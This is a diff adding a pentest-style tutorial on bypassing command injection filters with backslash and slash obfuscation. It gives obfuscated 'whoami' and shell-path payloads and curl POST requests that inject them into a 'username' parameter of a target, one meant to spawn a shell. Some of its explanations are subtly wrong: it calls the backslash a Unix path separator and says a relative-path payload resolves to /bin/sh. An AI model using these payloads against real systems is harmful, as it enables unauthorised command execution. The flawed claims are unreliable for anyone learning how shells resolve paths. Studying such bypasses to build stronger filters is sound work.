@@ -1,0 +1,74 @@
+---
+title: Bypass Command Injection with Backslash and Slash
+description: Learn to bypass command injection filters using backslash and slash obfuscation
+  techniques in shell paths.
+keywords:
+- command injection
+- filter bypass
+- backslash and slash
+- path obfuscation
+- shell path manipulation
+- Unix-like shells
+- command line interpreter
+---
+
+# Bypass With Backslash And Slash
+
+## Context
+
+The objective of this article is to demonstrate how to bypass command injection filters using backslash and slash obfuscation in shell command paths. This technique assumes that readers have a foundational understanding of command line interpreter behavior, shell command syntax, basic command injection exploitation, and concepts of path traversal.
+
+## Theory
+
+### Backslash and Slash Usage in Shells
+
+In Unix-like shells, the backslash (`\`) serves as an escape character, which can also act as a path separator. Meanwhile, the slash (`/`) is the standard directory separator in Unix-like file systems. When commands are executed, shells will normalize any redundant or obfuscated path separators, which allows for flexibility and potential exploitation in forming paths that bypass simple filters.
+
+### Obfuscation Techniques for Filter Bypass
+
+Obfuscating paths with backslashes and multiple slashes is a known technique to evade input filters or blacklists that are not thorough or that rely on simple string matching. Many filters aim to block specific keywords or patterns, such as 'sh', 'bin', or 'whoami', without accounting for variations introduced by interleaving backslashes or slashes.
+
+### Shell Path Manipulation for Command Injection
+
+Shell interpreters have mechanisms for resolving paths, including those that might appear obfuscated. For example, paths like `\\/\\/\\/bin\\/sh` resolve to `/bin/sh`, and `w\\h\\o\\a\\m\\i` resolves to `whoami`. By understanding this behavior, attackers can craft payloads to inject commands that bypass naive filters or blacklists.
+
+## Practice
+
+### Bypassing Filters with Backslash and Slash Obfuscation
+
+The following steps outline how to manually exploit command injection vulnerabilities by bypassing filters using backslash and slash obfuscation:
+
+- Identify input fields that are potentially vulnerable to command injection. This often includes parameters that are directly passed into shell commands or scripts without proper sanitization.
+
+- Employ an obfuscated version of the `whoami` command by substituting each character with a backslash, such as `w\\h\\o\\a\\m\\i`. This variant is likely to evade filters targeting the literal string.
+
+    ```bash
+    w\h\o\a\m\i
+    ```
+
+- Use an obfuscated path to reference the shell binary, such as `\\b\\i\\n\\/\\/\\/\\/\\/s\\h`, thus bypassing filters that block 'sh' or the path '/bin/sh'.
+
+    ```bash
+    \b\i\n\/\/\/\/\/s\h
+    ```
+
+- Inject the obfuscated command using HTTP POST requests. For instance, inject a payload into a vulnerable parameter called 'username':
+
+    ```bash
+    curl -X POST -d "username=admin;w\\h\\o\\a\\m\\i" http://target/vuln
+    ```
+
+- Attempt to spawn a shell using the obfuscated path:
+
+    ```bash
+    curl -X POST -d "username=admin;\\b\\i\\n\\/\\/\\/\\/\\/s\\h" http://target/vuln
+    ```
+
+Upon executing these obfuscated commands, if implemented on a vulnerable system, they should bypass basic keyword or path filters, allowing the shell to execute the intended commands.
+
+## Tools
+
+- **curl**
+- **Burp Suite** 
+
+These tools are instrumental in crafting and sending HTTP requests with the desired payloads.
